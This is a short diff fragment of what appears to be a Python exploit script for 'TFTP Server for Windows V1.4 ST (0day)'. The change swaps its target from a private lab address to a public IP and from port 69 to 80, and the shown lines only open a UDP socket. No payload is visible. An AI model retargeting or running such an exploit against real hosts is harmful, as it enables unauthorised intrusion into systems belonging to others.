@@ -26,8 +26,8 @@ import sys
 print "[*] TFTP Server for Windows V1.4 ST (0day)"
 print "[*] http://www.offensive-security.com"
 
-host = '172.16.167.134'
-port = 69
+host = '37.48.68.134'
+port = 80
 
 try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
